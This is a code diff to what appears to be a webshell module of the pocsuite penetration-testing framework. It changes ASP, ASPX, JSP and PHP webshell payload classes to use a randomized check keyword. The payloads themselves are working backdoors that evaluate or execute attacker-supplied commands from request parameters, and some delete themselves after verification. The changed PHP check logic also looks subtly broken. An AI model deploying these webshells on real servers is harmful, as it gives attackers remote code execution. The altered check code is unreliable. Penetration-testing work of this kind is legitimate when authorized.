@@ -7,6 +7,7 @@ See the file 'docs/COPYING' for copying permission
 """
 
 from pocsuite.lib.request.basic import req
+from pocsuite.api.utils import randomStr
 
 
 class Webshell:
@@ -53,48 +54,53 @@ class VerifyShell(Webshell):
 
 
 class AspShell(Webshell):
+    _keyword = randomStr(20)
     _password = 'cmd'
     _content = '<%eval request("{0}")%>'
     _check_statement = 'Response.Write(Replace("202cTEST4b70","TEST",' \
-                       '"b962ac59075b964b07152d23"))'
-    _keyword = '202cb962ac59075b964b07152d234b70'
+                       '"' + _keyword + '"))'
+    _keyword = '202c%s4b70' % _keyword
 
 
 class AspVerify(VerifyShell):
+    _keyword = randomStr(20)
     _content = '<%\n' \
         'Response.Write(Replace("202cTEST4b70","TEST",' \
-        '"b962ac59075b964b07152d23"))\n' \
+        '"' + _keyword + '"))\n' \
         'CreateObject("Scripting.FileSystemObject").' \
         'DeleteFile(Request.ServerVariables("Path_Translated"))\n' \
         '%>'
-    _keyword = '202cb962ac59075b964b07152d234b70'
+    _keyword = '202c%s4b70' % _keyword
 
 
 class AspxShell(Webshell):
+    _keyword = randomStr(20)
     _password = 'cmd'
     _content = '<%@ Page Language="Jscript"%>' \
                '<%eval(Request.Item["{0}"],"unsafe");%>'
     _check_statement = 'Response.Write("202cTEST4b70".Replace("TEST",' \
-                       '"b962ac59075b964b07152d23"))'
-    _keyword = '202cb962ac59075b964b07152d234b70'
+                       '"' + _keyword + '"))'
+    _keyword = '202c%s4b70' % _keyword
 
 
 class AspxVerify(VerifyShell):
+    _keyword = randomStr(20)
     _content = '<%@ Page Language="Jscript" ContentType="text/html" ' \
         'validateRequest="false" aspcompat="true"%>\n' \
         '<%Response.Write("202cTEST4b70".Replace("TEST",' \
-        '"b962ac59075b964b07152d23"))%>\n' \
+        '"' + _keyword + '"))%>\n' \
         '<%System.IO.File.Delete(Request.PhysicalPath);%>'
-    _keyword = '202cb962ac59075b964b07152d234b70'
+    _keyword = '202c%s4b70' % _keyword
 
 
 class JspShell(Webshell):
+    _keyword = randomStr(20)
     _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
         '<%@ page import="java.io.*"%>\n' \
         '<%@ page import="java.util.*"%>\n' \
         '<%\n' \
         'if (request.getParameter("check") == "1")\n' \
-        '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));\n' \
+        '    out.println("202cTEST4b70".replace("TEST","' + _keyword + '"));\n' \
         'if (request.getParameter("{0}") != null)\n' \
         '{{\n' \
         '    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n' \
@@ -111,10 +117,11 @@ class JspShell(Webshell):
         '%>\n'
     _password = 'cmd'
     _check_data = {'check': '1'}
-    _keyword = '202cb962ac59075b964b07152d234b70'
+    _keyword = '202c%s4b70' % _keyword
 
 
 class JspVerify(VerifyShell):
+    _keyword = randomStr(20)
     _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
         '<%@ page import="java.io.*"%>\n' \
         '<%@ page import="java.util.*"%>\n' \
@@ -126,17 +133,17 @@ class JspVerify(VerifyShell):
         '  d.delete();\n' \
         '  }}\n' \
         '%>\n' \
-        '<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));%>'
-    _keyword = '202cb962ac59075b964b07152d234b70'
+        '<% out.println("202cTEST4b70".replace("TEST","' + _keyword + '"));%>'
+    _keyword = '202c%s4b70' % _keyword
 
 
 class PhpShell(Webshell):
+    _keyword = randomStr(20)
     _password = 'cmd'
     _content = "<?php @assert($_REQUEST['{0}']);?>"
-    _check_statement = 'var_dump(md5(123));'
-    _keyword = '202cb962ac59075b964b07152d234b70'
+    _check_statement = 'var_dump(md5(' + _keyword + '));'
 
 
 class PhpVerify(VerifyShell):
-    _content = "<?php var_dump(md5(123));unlink(__FILE__);?>"
-    _keyword = '202cb962ac59075b964b07152d234b70'
+    _keyword = randomStr(20)
+    _content = "<?php var_dump(md5(" + _keyword + "));unlink(__FILE__);?>"
